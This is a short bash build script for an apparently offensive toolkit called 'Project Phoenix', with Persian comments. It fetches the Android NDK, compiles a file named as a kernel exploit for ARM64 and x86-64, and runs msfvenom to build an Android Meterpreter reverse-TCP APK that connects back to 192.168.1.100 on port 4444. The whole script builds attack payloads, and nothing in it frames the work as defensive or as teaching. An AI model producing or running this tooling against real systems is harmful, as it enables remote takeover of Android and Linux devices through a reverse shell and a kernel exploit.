#!/bin/bash
# Phoenix Compilation Script

echo "🔥 Project Phoenix - Compilation Script"
echo "========================================"

# تنظیم مسیر NDK
NDK_PATH=~/Project_Phoenix/04_tools/ndk/android-ndk-r27

# بررسی وجود NDK
if [ ! -d "$NDK_PATH" ]; then
    echo "[-] NDK not found! Downloading..."
    cd ~/Project_Phoenix/04_tools/ndk/
    wget https://dl.google.com/android/repository/android-ndk-r27-linux.zip
    unzip android-ndk-r27-linux.zip
    cd ../..
fi

echo "[*] Compiling kernel exploit for ARM64..."
$NDK_PATH/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang \
    03_exploits/kernel/phoenix_kernel.c \
    -o 02_payloads/android/phoenix_kernel_arm64 \
    -pthread -static

echo "[*] Compiling kernel exploit for x86-64..."
gcc 03_exploits/kernel/phoenix_kernel.c \
    -o 02_payloads/linux/phoenix_kernel_x64 \
    -pthread

echo "[*] Generating Meterpreter payload..."
msfvenom -p android/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -o 02_payloads/android/phoenix_meterpreter.apk

echo "[+] Compilation complete!"
ls -lh 02_payloads/android/
